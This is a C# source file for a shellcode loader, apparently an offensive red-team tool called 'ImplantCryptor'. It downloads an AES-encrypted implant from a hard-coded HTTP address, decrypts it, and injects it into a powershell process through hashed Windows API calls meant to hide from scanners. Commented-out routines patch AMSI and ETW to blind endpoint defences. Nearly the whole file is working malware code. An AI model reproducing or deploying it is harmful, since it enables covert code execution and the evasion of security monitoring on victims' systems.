using System.Security.Cryptography;
using System.Net.Http;
using System;
using System.IO;

namespace ImplantCryptor
{
  //////////////////
  //// CHANGEME ////
  //////////////////
  class Constants
  {
    public static string implantAddr64 = "http://192.168.68.1:5959/test/implant_s.shc.enc";
    public static string implantAddr86 = "";
    public static bool is86 = false; // TODO
    public static byte[] key =
    {
      0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
      0x09, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16
    };
    public static long hashKey = 3528935294931742572;
    public static string targetProcessName = "powershell"; 

    public class Methods
    {
      public const string VirtualAlloc = "E52E9EFF82F019EF5BE974D961A1619F";
      public const string VirtualAllocEx = "4E064689D9E8546BAF40B5796408ECC3";
      public const string OpenProcess = "4CEBE4C6D23471820368619941A82E63";
      public const string WriteProcessMemory = "0F9F39ED5DD736FC695287D6E9BF9256";
      public const string VirtualProtect = "E0F51AC77931C1274BC653D4A3EEBF5F";
      public const string VirtualProtectEx = "DF23D472FBB72A5675C0184AD7062C17";
      public const string CreateThread = "AA949BF4C0CCEB6C7A9031D2033F2CCC";
      public const string CreateRemoteThread = "4E6866184DF1225E9F492577CFFCA56E";
      public const string NtCreateThreadEx = "A4ABC1CB85C8B2B999E5AC0D59FF2DC4";
      public const string NtAllocateVirtualMemory = "E26FE87993035DC6C294A1DA0ADCE80A";
      public const string ZwAllocateVirtualMemoryEx = "8564AD1B31673FB70A3EEDB8BA524A92";
      public const string NtOpenProcess = "43BE23900B78194CB928781DDE5FE032";
      public const string NtWriteVirtualMemory = "DB0AF07E8BA2B56720FBE16772A070DE";
      public const string IsWow64Process = "38297A3E118153C4609403D334ADF72B";
    }
  }

  class Program
  {


    static void Main(string[] args)
    {


      // IF encrypting
      if (!(args.Length == 0) && (args[0].Equals("-e")))
      {
        // Console.WriteLine("[!] Encrypting file");
        EncryptFile(args[1], Constants.key);
        return;
      }
      if (!(args.Length == 0) && (args[0].Equals("-h")))
      {
        // Console.WriteLine("[!] Encrypting file");
        string hash = DInvoke.GetAPIHash(args[1], Constants.hashKey);
        Console.WriteLine(hash);
        return;
      }



      // fetching an implant
      byte[] encImplant;
      if (Constants.is86)
      {
        encImplant = FetchHttpByteArray(Constants.implantAddr86);
      }
      else
      {
        encImplant = FetchHttpByteArray(Constants.implantAddr64);
      }
      // byte[] encImplant = System.IO.File.ReadAllBytes($"{args[0]}.enc");

      // decrypting
      byte[] implant = DecryptBytes(encImplant, Constants.key);

      Helpers.InjectBytecode(implant, Constants.hashKey, Constants.targetProcessName, Constants.is86);
    }

    public static byte[] FetchHttpByteArray(String address)
    {
      Byte[] returnBytes;
      HttpClient client = new HttpClient();
      returnBytes = client.GetByteArrayAsync(address).Result;
      return returnBytes;
    }

    public static void EncryptFile(string fileName, byte[] key)
    {
      byte[] fileBytes = System.IO.File.ReadAllBytes(fileName);

      // var str = System.Text.Encoding.Default.GetString(fileBytes);
      // Console.WriteLine(str);

      try
      {
        FileStream fileStream = new FileStream($"{fileName}.enc", FileMode.OpenOrCreate);
        using (Aes aes = Aes.Create())
        {
          aes.Key = key;

          byte[] iv = aes.IV;
          fileStream.Write(iv, 0, iv.Length);

          CryptoStream cryptoStream = new CryptoStream(fileStream, 
              aes.CreateEncryptor(), CryptoStreamMode.Write);
          BinaryWriter encryptWriter = new BinaryWriter(cryptoStream);
          encryptWriter.Write(fileBytes);
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine($"[!] Encryption failed : {ex}");
      }
    }

    public static byte[] DecryptBytes(byte[] encFileBytes, byte[] key)
    {
      byte[] implant;

      var memStream = new MemoryStream(encFileBytes);
      using (Aes aes = Aes.Create())
      {
        byte[] iv = new byte[aes.IV.Length];
        int numBytesToRead = aes.IV.Length;
        int numBytesRead = 0;
        while (numBytesToRead > 0)
        {
          int n = memStream.Read(iv, numBytesRead, numBytesToRead);
          if (n == 0) break;

          numBytesRead += n;
          numBytesToRead -= n;
        }


        CryptoStream cryptoStream = new CryptoStream(memStream,
            aes.CreateDecryptor(key, iv), CryptoStreamMode.Read);

        BinaryReader decryptReader = new BinaryReader(cryptoStream);
        // Console.WriteLine("[!] Decrypting file");
        implant = ReadAllBytes(decryptReader);

      }

      // Console.WriteLine(System.Text.Encoding.Default.GetString(implant));
      return implant;
    }

    public static byte[] ReadAllBytes(BinaryReader reader)
    {
      const int bufferSize = 4096;
      using (var ms = new MemoryStream())
      {
        byte[] buffer = new byte[bufferSize];
        int count;
        while ((count = reader.Read(buffer, 0, buffer.Length)) != 0)
          ms.Write(buffer, 0, count);
        return ms.ToArray();
      }
    }

    public static void PatchAmsi()
    {
      // // offset 0x83 => 0x74
      // // offset 0x95 => 0x75
      //
      // IntPtr lib = LoadLibrary("amsi.dll");
      // IntPtr amsi = GetProcAddress(lib, "AmsiScanBuffer");
      // IntPtr final = IntPtr.Add(amsi, 0x95);
      // uint old = 0;
      //
      // VirtualProtect(final, (UInt32)0x1, 0x40, out old);
      //
      // Console.WriteLine(old);
      // byte[] patch = new byte[] { 0x75 };
      // Marshal.Copy(patch, 0, final, 1);
      //
      // VirtualProtect(final, (UInt32)0x1, old, out old);
    }

    public static void PatchEtw()
    {
      // DWORD dwOld = 0;
      // FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary("ntdll.dll"), "NtTraceEvent");
      // VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
      // memcpy(ptrNtTraceEvent, "\xc3", 1);
      // VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
      // return 0;
    }
  }
}
